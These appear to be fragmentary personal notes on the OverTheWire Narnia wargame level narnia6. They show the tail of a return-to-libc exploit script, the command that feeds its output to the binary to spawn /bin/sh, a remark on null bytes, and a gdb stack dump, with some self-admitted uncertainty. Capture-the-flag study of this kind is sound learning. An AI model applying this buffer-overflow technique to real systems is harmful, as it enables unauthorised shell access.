 14 print padding + system + return_after_system + bin_sh


./narnia6 $(python /tmp/tmp112/exploit.py) aaaaaaaa/bin/sh

the key thing here is the null byte as you have to use the second input as after that it will have null byte
if you just used one then the system() would read the wrong command

not sure ab out this one

r AAAAAAAAAA BBBBBBBB
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia6 AAAAAAAAAA BBBBBBBB

Breakpoint 1, 0x080486e7 in main ()
(gdb) x/100s $esp
0xffffd688:     "\224\326\377\377BBBBBBBB"
0xffffd695:     "AAAAAAAAA"

not sure about the \224\326\377\377 but the second is lower in the stack
